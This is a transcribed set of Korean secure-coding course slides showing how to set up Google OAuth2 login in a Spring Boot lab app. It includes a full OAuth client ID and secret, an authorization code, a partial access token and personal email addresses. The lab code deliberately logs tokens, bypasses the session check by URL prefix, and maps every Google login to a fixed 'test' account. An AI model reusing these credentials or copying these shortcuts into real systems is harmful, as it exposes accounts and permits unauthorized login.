(※ 검증: Python으로 확인 — 주소창 highlightClient 값과 표의 클라이언트 ID 앞부분 `131457979987-4eg2`가 앞 슬라이드의 전체 ID와 일치)

---

## [2-SLIDES] 5주차 2차시 p.21 · Google OAuth 클라이언트 생성
Google OAuth 클라이언트 생성
6. 데이터 액세스 설정
항목 추가 또는 삭제 화면으로 들어가서 2개 항목 선택 하고 [업데이트] 버튼 클릭

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처 1 — Google Cloud 콘솔 '데이터 액세스' 화면]**
- 브라우저 탭: `데이터 액세스 – Google 인증 …`, 주소창: `https://console.cloud.google.com/auth/scopes?hl=ko&inv=1&invt=AbqlbA&organization…`
- 상단 바: Google Cloud / 프로젝트 선택 `OAuth2 Test` / 검색창 `동의` / [검색]
- 경로: Google 인증 플랫폼 / 데이터 액세스
- 왼쪽 메뉴: 개요 · 브랜딩 · 대상 · 클라이언트 · **데이터 액세스**(빨간 박스) · 인증 센터
- 본문 '데이터 액세스': "범위는 사용자에게 앱 승인을 요청하는 권한을 나타내며 프로젝트에서 사용자의 Google 계정에 있는 특정 유형의 비공개 사용자 데이터에 액세스하도록 허용합니다. 자세히 알아보기"
- **[범위 추가 또는 삭제]** 버튼(빨간 박스)
- '민감하지 않은 범위' 표(열: API ↑ | 범위 | 사용자에게 표시되는 설명) — "표시할 행이 없습니다."
- '🔒 민감한 범위' — "민감한 범위는 비공개 사용자 데이터에 대한 액세스를 요청하는 범위입니다." 표(API ↑ | 범위 | 사용자에게 표시되는 설명) — "표시할 행이 없습니다."

**[화면 캡처 2 — '선택한 범위 업데이트' 패널]**
- 안내: "아래에는 사용 설정된 API의 범위만 나와 있습니다. 이 화면에 누락된 범위를 추가하려면 Google API 라이브러리에서 API를 찾아 사용 설정하거나 아래의 '붙여넣은 범위' 텍스트 상자를 사용하세요. 라이브러리에서 사용 설정한 새 API를 확인하려면 페이지를 새로고침하세요."
- 필터: 속성 이름 또는 값 입력

| 선택 | API | 범위 | 사용자에게 표시되는 설명 |
|---|---|---|---|
| ☑ (빨간 박스) | | `.../auth/userinfo.email` | 기본 Google 계정의 이메일 주소 확인 |
| ☑ (빨간 박스) | | `.../auth/userinfo.profile` | 개인정보(공개로 설정한 개인정보 포함) 보기 |
| ☐ | | `openid` | Google에서 내 개인 정보를 나와 연결 |
| ☐ | Analytics Hub API | `.../auth/bigquery` | View and manage your data in Google BigQuery and see the email address for your Google Account |
| ☐ | Analytics Hub API | `.../auth/cloud-platform` | Google Cloud 데이터 확인, 수정, 구성, 삭제 및 Google 계정의 이메일 주소 확인 |
| ☐ | BigQuery API | `.../auth/bigquery.readonly` | Google BigQuery에서 데이터를 봅니다. |
| ☐ | BigQuery API | `.../auth/cloud-platform.read-only` | Google Cloud 서비스 전체의 데이터 조회 및 Google 계정의 이메일 주소 확인 |
| ☐ | BigQuery API | `.../auth/devstorage.full_control` | Manage your data and permissions in Cloud Storage and see the email address for your Google Account |
| ☐ | BigQuery API | `.../auth/devstorage.read_only` | Google 클라우드 저장소에서 데이터 조회 |
| ☐ | BigQuery | `.../auth/devstorage…` | Cloud Storage의 데이터 관리 및 Google 계정의 이메일 주소 확… (이하 잘림) |

→ 선택하는 2개 항목 = `userinfo.email`, `userinfo.profile` (뒤 슬라이드 인가 요청 URL의 scope와 동일).

**[화면 캡처 3 — 패널 하단 '직접 범위 추가']**
- "추가할 범위가 위 표에 표시되지 않으면 여기에 입력할 수 있습니다. 각 범위를 새 줄에 입력하거나 쉼표로 구분해야 합니다. 'https://'로 시작하는 전체 범위 문자열을 입력하세요. 완료되면 '표에 추가'를 클릭하세요."
- 빈 입력 상자, [테이블에 추가] 버튼, 맨 아래 **[업데이트]** 버튼(빨간 박스)

---

## [2-SLIDES] 5주차 2차시 p.22 · Google OAuth 클라이언트 생성
Google OAuth 클라이언트 생성
7. 대상 설정
대상 > 테스트 사용자 > + ADD USERS 에 본인 메일 주소 입력

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처 1 — '대상' 화면]**
- 브라우저 탭: `대상 – Google 인증 플랫폼 – C…`, 주소창: `https://console.cloud.google.com/auth/audience?hl=ko&inv=1&invt=AbqlbA&organizati…`
- 상단 바: Google Cloud / `OAuth2 Test` / 검색창 `동의`
- 경로: Google 인증 플랫폼 / 대상
- 왼쪽 메뉴: 개요 · 브랜딩 · **대상**(빨간 박스) · 클라이언트 · 데이터 액세스 · 인증 센터
- 'OAuth 사용자 한도 ?': "게시 상태가 '테스트 중'으로 설정된 동안에는 테스트 사용자만 앱에 액세스할 수 있습니다. 앱 인증 전에 허용되는 사용자 한도는 100명이며 앱의 전체 수명 주기에서 계산됩니다. 자세히 알아보기" / 진행 막대 "사용자 0명(테스트 0명, 기타 0명)/사용자 한도100명"
- '테스트 사용자' — **[+ ADD USERS]** 버튼(빨간 박스)
- 필터(속성 이름 또는 값 입력) / 표 열 '사용자 정보' — "표시할 행이 없습니다." / '∧ 간략히 보기'

**[화면 캡처 2 — '사용자 추가' 패널]**
- ⚠ "게시 상태가 '테스트 중'으로 설정된 동안에는 테스트 사용자만 앱에 액세스할 수 있습니다. 앱 인증 전에 허용되는 사용자 한도는 100명이며 앱의 전체 수명 주기에서 계산됩니다." LEARN MORE
- 입력란: `pineful@gmail.com` (빨간 박스), 글자 수 표시 `0 / 100`
- **[저장]** 버튼

---

## [2-SLIDES] 5주차 2차시 p.23 · Google OAuth 클라이언트 생성
Google OAuth 클라이언트 생성
8. 설정 확인 및 테스트
사용자 인증 정보 > OAuth 2.0 클라이언트 ID > 생성한 웹 클라이언트 항목의 맨 끝 다운로드 아이콘 클릭
아래 URL에 클라이언트 ID를 넣어 구글 로그인 창이 뜨는지 확인
https://accounts.google.com/o/oauth2/auth?client_id=클라이언트ID&redirect_uri=http://localhost:8000/login/oauth2/code/google&response_type=code&scope=https://
www.googleapis.com/auth/userinfo.email+https://www.googleapis.com/auth/userinfo.profile

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처 1 — API 및 서비스 > 사용자 인증 정보, '웹 클라이언트 1' 팝업]**
- 브라우저 탭: `사용자 인증 정보 – API 및 서비…`, 주소창: `https://console.cloud.google.com/apis/credentials?hl=ko&inv=1&invt=AbqlbA&organizationId=0&pr…`
- 상단: Google Cloud / `OAuth2 Test` / 검색창 `사용자 인증 정보`
- 왼쪽 메뉴(API 및 서비스): 사용 설정된 API 및 서비스 · 라이브러리 · **사용자 인증 정보**(선택됨) · OAuth 동의 화면 · 페이지 사용 동의
- 상단 버튼: [+ 사용자 인증 정보 만들기] [삭제] [삭제된 사용자 인증 정보 복원]
- 배경 목록의 OAuth 2.0 클라이언트 ID 행 끝 아이콘: 연필(수정) · 휴지통(삭제) · **⬇ 다운로드**; 클라이언트 ID 열 `…57979987-4eg2...`
- 팝업 '웹 클라이언트 1' (클라이언트 ID·보안 비밀번호 부분 빨간 박스):

| 항목 | 값 |
|---|---|
| 클라이언트 ID | `131457979987-4eg2qpr3kuodbf3eeorjsq3p46u8pv2v.apps.googleusercontent.com` |
| 클라이언트 보안 비밀번호 | `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` |
| 생성일 | 2025년 2월 26일 PM 5시 5분 10초 GMT+9 |
| 상태 | ✅ 사용 설정됨 |

- [⬇ JSON 다운로드], [닫기]
- (※ 검증: Python으로 확인 — 클라이언트 ID는 `숫자12자리-영숫자32자.apps.googleusercontent.com`, 보안 비밀번호는 `GOCSPX-` + 28자 형식으로 Google OAuth 클라이언트 형식과 일치. 25쪽 application.properties에 보이는 일부 값 `GOCSPX-8MyKdI60-rfs…`, `…jsq3p46u8pv2v.apps.googleusercontent.com`와도 일치)

**[화면 캡처 2 — 위 URL 접속 결과: Google 로그인 '계정 선택' 화면]**
- 탭: `웹 애플리케이션의 클라이언트` / `로그인 - Google 계정`, 주소창: `https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?client_id=131457979987-4eg2qpr3…`
- 'G Google 계정으로 로그인' — **계정 선택**, "OAuth2 Test(으)로 이동"
- 계정 목록: 박민순 `mspark@openeg.co.kr` (로그아웃됨) / 박민순 `pineful@gmail.com` / 다른 계정 사용
- 하단: 한국어 ▾ · 도움말 · 개인정보처리방침 · 약관(일부를 파란 박스로 가림)

**[테스트 URL 파라미터 정리]** (※ 검증: Python `urllib.parse`로 분해 — 일치)
```
엔드포인트     : https://accounts.google.com/o/oauth2/auth
client_id      : 클라이언트ID
redirect_uri   : http://localhost:8000/login/oauth2/code/google
response_type  : code
scope          : https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile   ('+' = 공백 구분)
```
(※ 검증: URL의 redirect_uri 포트는 **8000**인데, 26쪽 Google 콘솔 '승인된 리디렉션 URI'와 25쪽 `oauth2.google.redirect-uri`는 **8080**으로 표기됨 — 원문 내부 불일치. Google은 등록된 URI와 정확히 일치해야 하므로 실제로는 둘 중 하나를 맞춰야 함. 서버 포트는 25쪽 `server.port=8000`, 29쪽 콘솔 `Tomcat started on port(s): 8000`)

---

## [2-SLIDES] 5주차 2차시 p.24 · Authorization Code 발급
Authorization Code 발급
〮 Google OAuth API 등록 필요
〮 사용자가 구글 로그인을 마치고 나면 redirect_uri에 Authorization Code를 응답해 줌

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[도식 — Google OAuth 2.0 웹 서버 흐름 시퀀스 다이어그램]** (참여자: User / Your App / Google Servers)
```
Your App ──Request token──────────────────────▶ Google Servers
User     ──User login & consent───────────────▶ Google Servers     ┐ 빨간 박스
Your App ◀- - - - Authorization code - - - - - - Google Servers     ┘ (이번 단계)
Your App ──Exchange code for token────────────▶ Google Servers
Your App ◀- - - - Token response - - - - - - - - Google Servers
Your App ──Use token to call Google API───────▶ Google Servers
```
- 빨간 박스: 'User login & consent' → 'Authorization code' 구간 = 이 슬라이드에서 구현하는 Authorization Code 발급 단계.

---

## [2-SLIDES] 5주차 2차시 p.25 · Authorization Code 발급
Authorization Code 발급
〮 구축되어 있는 LAB 환경에 소스 추가하여 OAuth2 연동 테스트 구현
〮 LAB 소스코드에서 src/main/resources/application.properties 파일에 클라이언트 ID,
클라이언트 Secret, 토큰, 리소스 URI 등 내용 추가
발급받은 클라이언트 ID값
발급받은 클라이언트 Secret 값
입력한 리디렉트 URI 값

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[코드 캡처 — `application.properties` (Eclipse/STS 편집기)]**
```properties
# Server
server.port=8000
#server.error.whitelabel.enabled=false
#server.error.include-exception=true
#server.error.include-stacktrace=always

spring.web.resources.static-locations=classpath:/static/

# thymeleaf
spring.thymeleaf.prefix=classpath:templates/
spring.thymeleaf.check-template-location=true
spring.thymeleaf.suffix=.html
spring.thymeleaf.mode=HTML5
spring.thymeleaf.cache=false

logging.config=classpath:log4j2.xml

# OAuth2 Test
oauth2.google.client-id=1314579…(라벨에 가려짐)…jsq3p46u8pv2v.apps.googleusercontent.com
oauth2.google.client-secret=GOCSPX-8MyKdI60-rfs…(라벨에 가려짐)
oauth2.google.redirect-uri=http://localhost:8080/login/oauth2/code/goo…(라벨에 가려짐)
oauth2.google.token-uri=https://oauth2.googleapis.com/token
oauth2.google.resource-uri=https://www.googleapis.com/oauth2/v2/userinfo
```
- 행 번호 1~23 (17행 빈 줄, 24행 이하 빈 줄). 18~23행(`# OAuth2 Test` 블록) 전체가 빨간 박스.
- 빨간 라벨 위치: "발급받은 클라이언트 ID값" → 19행 client-id, "발급받은 클라이언트 Secret 값" → 20행 client-secret, "입력한 리디렉트 URI 값" → 21행 redirect-uri.
- (※ 검증: 30쪽 코드의 `env.getProperty("oauth2." + registrationId + ".client-id")` 등에 registrationId=`google`을 넣으면 위 키 `oauth2.google.client-id/client-secret/redirect-uri/token-uri`와 정확히 일치 — Python으로 확인)
- (※ 검증: `server.port=8000`인데 `redirect-uri`는 `localhost:8080` — 23·29쪽 인가 요청 URL(`localhost:8000`)과 불일치. 토큰 교환 시 redirect_uri는 인가 요청 때 값과 같아야 하므로 원문 내부 모순)

---

## [2-SLIDES] 5주차 2차시 p.26 · Authorization Code 발급
Authorization Code 발급
〮 컨트롤러
〮 기존 로그인 컨트롤러 소스코드인 LoginController.java 끝에 코드 추가
〮 kr.co.openeg.lab.loginController.LoginController.java
kr.co.openeg.lab.login.controller.LoginController.java

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처 — Google 콘솔 '승인된 리디렉션 URI' 입력란]**
- 제목 "승인된 리디렉션 URI ?", 설명 "웹 서버의 요청에 사용"
- `URI 1 *` 입력값: `http://localhost:8080/login/oauth2/code/google` (빨간 박스)
- (※ 검증: 포트 8080 — 23·29쪽 테스트 URL의 redirect_uri `http://localhost:8000/...` 및 `server.port=8000`과 불일치. 원문 표기 그대로)

**[코드 캡처 — LoginController.java 55~82행, 74~81행 파란 박스가 추가 코드]**
```java
            mav.addObject("userId", userId);
            mav.addObject("errCode", 1);    // not exist userId in database
            mav.setViewName("index");
            return mav;
        }else {
            session.setAttribute("userId", userId);
            session.setAttribute("userName", loginCheckResult.getUserName());
            mav.setViewName("redirect:/board/main");

            return mav;
        }
    }

    @RequestMapping("/logout")
    public String logout(HttpSession session){
        session.invalidate();
        return "redirect:login";
    }

    // ── 74~81행: 추가 코드(파란 박스) ──
    @RequestMapping("/login/oauth2/code/{registrationId}")
    public ModelAndView googleLogin(@RequestParam(required = false) String code, @PathVariable String registrationId) {
        service.socialLogin(code, registrationId);

        ModelAndView mav = new ModelAndView();
        mav.setViewName("redirect:/");
        return mav;
    }
}
```
- 코드 아래 캡션 상자: `kr.co.openeg.lab.login.controller.LoginController.java`
- (※ 원문 표기 그대로 — 본문 경로는 `kr.co.openeg.lab.loginController.LoginController.java`, 캡션은 `kr.co.openeg.lab.login.controller.LoginController.java`로 서로 다름. 실제 패키지는 캡션 쪽(`login.controller`)으로 보임)
- (※ 검증: 리디렉트 경로 `/login/oauth2/code/google`이 `/login/oauth2/code/{registrationId}`에 매칭되어 registrationId=`google` — Python 정규식으로 확인, 29쪽 콘솔 `registrationId = google`과 일치)

---

## [2-SLIDES] 5주차 2차시 p.27 · Authorization Code 발급
Authorization Code 발급
〮 서비스
〮 기존 로그인 서비스 소스코드인 LoginService.java 끝에 코드 추가
〮 kr.co.openeg.lab.loginService.LoginService.java

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[코드 캡처 — LoginService.java 1~30행, 25~28행 파란 박스가 추가 코드]**
```java
package kr.co.openeg.lab.login.service;

import org.springframework.beans.factory.annotation.Autowired;[...]   // 4~9행 import 접힘

@Service
public class LoginService {

    @Autowired
    private LoginDao dao;

    public MemberModel checkUserId(String userId) {
        return dao.selectUserId(userId);
    }

    public MemberModel checkUserId(LoginSessionModel loginModel) {
        return dao.selectUserId(loginModel);
    }

    // ── 25~28행: 추가 코드(파란 박스) ──
    public void socialLogin(String code, String registrationId) {
        System.out.println("code = " + code);
        System.out.println("registrationId = " + registrationId);
    }

}
```
- (※ 원문 표기 그대로 — 본문 경로는 `kr.co.openeg.lab.loginService.LoginService.java`이지만 코드의 패키지 선언은 `kr.co.openeg.lab.login.service`)

---

## [2-SLIDES] 5주차 2차시 p.28 · Authorization Code 발급
Authorization Code 발급
〮 로그인 필터
〮 로그인되어 있지 않아도 /login/oauth2 이하 URL 접근이 가능하도록 SessionInterceptor.java 소스코드 수정
〮 kr.co.openeg.lab.common.interceptor.SessionInterceptor.java

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[코드 캡처 — SessionInterceptor.java 21~49행, 35~40행 빨간 박스가 추가 코드]**
```java
        // pass through when access login.do, join.do

        if(request.getRequestURI().equals("/login")||
            request.getRequestURI().equals("/rest/login")||
            request.getRequestURI().equals("/vanilla/login")||
            request.getRequestURI().equals("/member/join")){
            if(userId != null){
                response.sendRedirect(request.getContextPath() + "/board/list");
                return true;
            } else {
                return true;
            }
        }

        // ── 36~40행: 추가 코드(빨간 박스) ──
        // bypass OAuth2 authentication URI
        if(request.getRequestURI().startsWith("/login/oauth2")) {
            System.out.println("oauth2 login bypass!");
            return true;
        }

        //
        // where other pages
        if(userId == null){
            response.sendRedirect(request.getContextPath() + "/login");
            HttpSession session=request.getSession();
            session.setAttribute("errCode", "4");
            return false;
        } else {
```
- (※ 검증: Python으로 확인 — `"/login/oauth2/code/google".startswith("/login/oauth2")` = True. 다만 `/login/oauth2evil`처럼 접두어만 같은 경로도 True가 되므로 `/login/oauth2/`로 끝 슬래시까지 비교하는 편이 더 엄격함)

---

## [2-SLIDES] 5주차 2차시 p.29 · Authorization Code 발급
Authorization Code 발급
〮 앞서 시도해봤던 URL을 입력하여 구글 로그인 창이 나타나며, 계정을 선택하고 진행하면 STS 콘솔에 메시지가 제대로
출력되면 성공
https://accounts.google.com/o/oauth2/auth?client_id=클라이언트ID&redirect_uri=http://localhost:8000/login/oa
uth2/code/google&response_type=code&scope=https://www.googleapis.com/auth/userinfo.email+https://www.google
apis.com/auth/userinfo.profile

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[테스트 URL — 한 줄로 이어 쓴 형태]**
```
https://accounts.google.com/o/oauth2/auth?client_id=클라이언트ID&redirect_uri=http://localhost:8000/login/oauth2/code/google&response_type=code&scope=https://www.googleapis.com/auth/userinfo.email+https://www.googleapis.com/auth/userinfo.profile
```
(슬라이드에서 '클라이언트ID'는 빨간 글씨 = 실제 값으로 바꿔 넣을 자리)

**[화면 캡처 1 — 계정 선택]** 탭 `클라이언트 – Google 인증 플랫…` / `로그인 - Google 계정`, 주소 `https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?client_id=131457979987-4eg2qpr3…`; 'Google 계정으로 로그인' — 계정 선택, "OAuth2 Test(으)로 이동", 계정 2개(이름·메일 파란 박스로 가림), 다른 계정 사용.

**[화면 캡처 2 — 동의 화면]** 주소 `https://accounts.google.com/signin/oauth/id?authuser=0&part=AJi8hAN8hZMzwEaAs7mCpMC2UHb…`; "OAuth2 Test 서비스로 로그인", 계정 `pineful@gmail.com ▾`; 안내 "계속하면 Google에서 내 이름, 이메일 주소, 언어 환경설정, 프로필 사진을 OAuth2 Test 서비스와 공유합니다. OAuth2 Test의 개인정보처리방침 및 서비스 약관을 참고하세요." "Google 계정에서 Google 계정으로 로그인을 관리할 수 있습니다." 버튼 [취소] [계속].

**[STS 콘솔 캡처]** (탭: Problems · Javadoc · Declaration · Search · Console · Call Hierarchy; `SecureCoding - SecureCodingLabTestApplication [Spring Boot App] C:\SecureCoding2025\sts4\sts-4.10.0.RELEASE\plugins\org.eclipse.justj.openjdk.hotspot.jre…`)
```
2025-02-27 10:37:40 WARN  TemplateMode:150 - [THYMELEAF][restartedMain] Template Mode 'HTML5' is …
2025-02-27 10:37:40 INFO  OptionalLiveReloadServer:58 - LiveReload server is running on port 3572…
2025-02-27 10:37:40 INFO  Http11NioProtocol:173 - Starting ProtocolHandler ["http-nio-8000"]
2025-02-27 10:37:40 INFO  TomcatWebServer:220 - Tomcat started on port(s): 8000 (http) with conte…
2025-02-27 10:37:40 INFO  SecureCodingLabTestApplication:61 - Started SecureCodingLabTestApplicat…
2025-02-27 10:37:40 INFO  ConditionEvaluationDeltaLoggingListener:63 - Condition evaluation unchan…
2025-02-27 15:13:13 INFO  [/]:173 - Initializing Spring DispatcherServlet 'dispatcherServlet'
2025-02-27 15:13:13 INFO  DispatcherServlet:525 - Initializing Servlet 'dispatcherServlet'
2025-02-27 15:13:13 INFO  DispatcherServlet:547 - Completed initialization in 40 ms
2025-02-27 15:13:13 WARN  SessionIdGeneratorBase:173 - Creation of SecureRandom instance for sess…
oauth2 login bypass!                                                          ← 빨간 박스
code = 4/0AQSTgQG2cqjbbarYc53Iz8enPwqy7IT9PjwyqFlg0Wx7wPJhp_GypUbCTsgFD3-3l3hNBw   ← 빨간 박스
registrationId = google                                                       ← 빨간 박스
```
- 'oauth2 login bypass!'는 28쪽 인터셉터, 'code = …'/'registrationId = …'는 27쪽 socialLogin()의 출력. (※ 검증: code가 Google 인가 코드 형식인 `4/0A…`로 시작 — 일치; `3l3hNBw`의 l/1 구분은 판독 확신 낮음)

---

## [2-SLIDES] 5주차 2차시 p.30 · Access Token 발급
Access Token 발급
〮 발급받은 Authorization Code를 통해 Access Token 발급
〮 서비스 (코드 수정)
accessToken 발급 성공 콘솔 화면

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[코드 캡처 — LoginService.java 33~79행, 39~76행 빨간 박스가 수정 코드]**
```java
    }

    public MemberModel checkUserId(LoginSessionModel loginModel) {
        return dao.selectUserId(loginModel);
    }

    // ── 39~76행: 수정 코드(빨간 박스) ──
    private final Environment env;
    private final ObjectMapper objectMapper = new ObjectMapper();
    private final RestTemplate restTemplate = new RestTemplate();

    public LoginService(Environment env) {
        this.env = env;
    }
    public void socialLogin(String code, String registrationId) {
        String accessToken = getAccessToken(code, registrationId);
        System.out.println("accessToken = " + accessToken);
    }

    private String getAccessToken(String authorizationCode, String registrationId) {
        String clientId = env.getProperty("oauth2." + registrationId + ".client-id");
        String clientSecret = env.getProperty("oauth2." + registrationId + ".client-secret");
        String redirectUri = env.getProperty("oauth2." + registrationId + ".redirect-uri");
        String tokenUri = env.getProperty("oauth2." + registrationId + ".token-uri");

        MultiValueMap<String, String> params = new LinkedMultiValueMap<>();
        params.add("code", authorizationCode);
        params.add("client_id", clientId);
        params.add("client_secret", clientSecret);
        params.add("redirect_uri", redirectUri);
        params.add("grant_type", "authorization_code");

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

        HttpEntity entity = new HttpEntity(params, headers);

        ResponseEntity<String> response = restTemplate.exchange(tokenUri, HttpMethod.POST, entity, String.class);
        try {
            JsonNode accessTokenNode = objectMapper.readTree(response.getBody());
            return accessTokenNode.get("access_token").asText();
        } catch (IOException e) {
            throw new RuntimeException("Failed to parse access token response", e);
        }
    }

}
```
- 즉 토큰 엔드포인트 `https://oauth2.googleapis.com/token`에 `application/x-www-form-urlencoded` POST로 `code, client_id, client_secret, redirect_uri, grant_type=authorization_code` 전송 → 응답 JSON의 `access_token` 추출. (※ 검증: Python `urlencode`로 같은 본문 구성 확인 — 일치)

**[도식]** 24쪽과 같은 시퀀스 다이어그램(User / Your App / Google Servers). 이번에는 **'Exchange code for token' → 'Token response'** 구간이 빨간 박스.

**[콘솔 캡처 — accessToken 발급 성공]** (`… javaw.exe (2025. 2. 27. 오후 3:28:04)`)
```
2025-02-27 15:28:21 INFO  OptionalLiveReloadServer:58 - LiveReload server is running on port 35729
2025-02-27 15:28:21 INFO  Http11NioProtocol:173 - Starting ProtocolHandler ["http-nio-8000"]
2025-02-27 15:28:21 INFO  TomcatWebServer:220 - Tomcat started on port(s): 8000 (http) with context path ''
2025-02-27 15:28:21 INFO  SecureCodingLabTestApplication:61 - Started SecureCodingLabTestApplication in 3.253 seconds (JVM running for 15.57)
2025-02-27 15:28:51 INFO  [/]:173 - Initializing Spring DispatcherServlet 'dispatcherServlet'
2025-02-27 15:28:51 INFO  DispatcherServlet:525 - Initializing Servlet 'dispatcherServlet'
2025-02-27 15:28:51 INFO  DispatcherServlet:547 - Completed initialization in 1 ms
oauth2 login bypass!                                                          ← 빨간 박스
accessToken = ya29.a0AeXRPp4V7qUB7KdmiomBWLtBt7c4O0p3t9IhHl9pYJAN5nBrQZN-Ie9DXS_wLeipb7LOiuH78Um6oTb-5lWv5rD7os8j2cbedpVSNgRv2HdXaVq_BPyRh6_RFeWPEO8mhbHUEM…(오른쪽 잘림)   ← 빨간 박스
2025-02-27 15:28:56 WARN  FragmentProcessor:-1 - You don't need to put the layout:fragment/data-layout-fragment attribute into the <head> section - the dec…
```
- (※ 검증: Google access token의 `ya29.` 접두어 형식과 일치. 토큰 문자열의 O/0, l/1 구분은 판독 확신 낮음)
- (※ 참고: 실습 확인용으로 access token을 콘솔에 그대로 출력하는데, 35~36쪽의 'Access Token 유출' 관점에서는 운영 코드에서 토큰 로깅을 피해야 함)

---

## [2-SLIDES] 5주차 2차시 p.31 · Resource Server에서 유저정보 받기
Resource Server에서 유저정보 받기
〮 발급받은 Authorization Code를 통해 Access Token 발급
〮 서비스 (코드 수정)
최종적으로 유저정보 수신 성공

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 원문 표기 그대로 — 첫 줄 "발급받은 Authorization Code를 통해 Access Token 발급"은 30쪽 문구를 그대로 쓴 것으로, 이 슬라이드의 실제 내용은 Access Token으로 Resource Server에서 유저 정보 조회)

**[코드 캡처 1 — LoginService.socialLogin() 46~57행 (수정)]**
```java
    public void socialLogin(String code, String registrationId) {
        String accessToken = getAccessToken(code, registrationId);
        JsonNode userResourceNode = getUserResource(accessToken, registrationId);
        System.out.println("userResourceNode = " + userResourceNode);

        String id = userResourceNode.get("id").asText();
        String email = userResourceNode.get("email").asText();
        String nickname = userResourceNode.get("name").asText();
        System.out.println("id = " + id);
        System.out.println("email = " + email);
        System.out.println("nickname = " + nickname);
    }
```

**[코드 캡처 2 — getUserResource() 86~94행 (추가)]**
```java
    private JsonNode getUserResource(String accessToken, String registrationId) {
        String resourceUri = env.getProperty("oauth2."+registrationId+".resource-uri");

        HttpHeaders headers = new HttpHeaders();
        headers.set("Authorization", "Bearer " + accessToken);
        HttpEntity entity = new HttpEntity(headers);
        return restTemplate.exchange(resourceUri, HttpMethod.GET, entity, JsonNode.class).getBody();
    }
}
```
- 즉 `GET https://www.googleapis.com/oauth2/v2/userinfo` + 헤더 `Authorization: Bearer <access token>`.

**[도식]** 24쪽과 같은 시퀀스 다이어그램. 이번에는 **'Use token to call Google API'** 구간이 빨간 박스.

**[콘솔 캡처 — 최종적으로 유저정보 수신 성공]** (`… javaw.exe (2025. 2. 27. 오후 3:41:21)`)
```
2025-02-27 15:41:26 INFO  SecureCodingLabTestApplication:61 - Started SecureCodingLabTestApplication in 2.813 seconds (JVM running for 4.132)
2025-02-27 15:41:40 INFO  [/]:173 - Initializing Spring DispatcherServlet 'dispatcherServlet'
2025-02-27 15:41:40 INFO  DispatcherServlet:525 - Initializing Servlet 'dispatcherServlet'
2025-02-27 15:41:40 INFO  DispatcherServlet:547 - Completed initialization in 1 ms
oauth2 login bypass!                                                                  ← 빨간 박스(이하 nickname 행까지)
userResourceNode = {"id":"117678585699554568936","email":"(가림)","verified_email":true,"name":"(가림)","given_name":"(가림)","family_name":"(가림)","pictu…(잘림)
id = 117678585699554568936
email = (파란 박스로 가림)
nickname = (파란 박스로 가림)
2025-02-27 15:41:42 WARN  FragmentProcessor:-1 - You don't need to put the layout:fragment/data-layout-fragment attribute into the <head> section - the dec…
```
- (※ 검증: Python으로 확인 — Google 사용자 id `117678585699554568936`은 21자리 숫자로 Google 계정 고유 ID 형식과 일치. userinfo v2 응답 필드 id/email/verified_email/name/given_name/family_name/picture가 코드의 `get("id")`, `get("email")`, `get("name")`과 대응)

---

## [2-SLIDES] 5주차 2차시 p.32 · 유저 정보를 토대로 계정 연동
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

- 원래 id 또는 email 정보를 토대로 사용자 DB와 연동 로직을 구현해야 함. 편의상 강제로 test 계정과 연동 처리.

**· 컨트롤러 (코드 수정)** — LoginController.java 75~86행
```java
    @RequestMapping("/login/oauth2/code/{registrationId}")
    public ModelAndView googleLogin(
            @RequestParam(required = false) String code,
            @PathVariable String registrationId,
            HttpServletRequest request,
            HttpServletResponse response) {
        service.socialLogin(code, registrationId, request, response);

        ModelAndView mav = new ModelAndView();
        mav.setViewName("redirect:/board/main");
        return mav;
    }
```

**· 서비스 (코드 수정)** — LoginService.java 51~77행
```java
    public void socialLogin(String code, String registrationId, HttpServletRequest request, HttpServletResponse response) {
        String accessToken = getAccessToken(code, registrationId);
        JsonNode userResourceNode = getUserResource(accessToken, registrationId);
        System.out.println("userResourceNode = " + userResourceNode);

        String id = userResourceNode.get("id").asText();
        String email = userResourceNode.get("email").asText();
        String nickname = userResourceNode.get("name").asText();
        System.out.println("id = " + id);
        System.out.println("email = " + email);
        System.out.println("nickname = " + nickname);

        // 강제로 test 계정과 연동.
        MemberModel member = checkUserId("test");
        if (member == null) {
            throw new RuntimeException("User not found in local DB: test");
        }

        HttpSession session = request.getSession(true);
        session.setAttribute("userId", member.getUserId());
        session.setAttribute("userName", nickname);          // 이름을 구글 계정에서 가져온다.

        // 5? 클라이언트가 세션을 사용할 수 있도록 `JSESSIONID` 쿠키 설정
        response.setHeader("Set-Cookie", "JSESSIONID=" + session.getId() + "; Path=/; HttpOnly; Secure");

        System.out.println("OAuth2 Login 성공 - JSESSIONID 발급 완료");
    }
```
(73행 주석 맨 앞 '5' 뒤 글자는 '回'처럼 보이는 깨진 문자 — 판독 확신 낮음)

- test 계정으로 연동되어 세션 ID 발급됨

**[콘솔 캡처]** (`… javaw.exe (2025. 2. 27. 오후 4:45:41)`)
```
2025-02-27 16:46:02 INFO  DispatcherServlet:547 - Completed initialization in 1 ms
oauth2 login bypass!
userResourceNode = {"id":"117678585699554568936","email":"(가림)","verified_email":true,"name":"(가림)","given_name":"(가림)","family_name":"(가림)","pictu…(잘림)
id = 117678585699554568936
email = (파란 박스로 가림)
nickname = (파란 박스로 가림)
2025-02-27 16:46:03 INFO  HikariDataSource:110 - HikariPool-1 - Starting...
2025-02-27 16:46:03 INFO  HikariDataSource:123 - HikariPool-1 - Start completed.
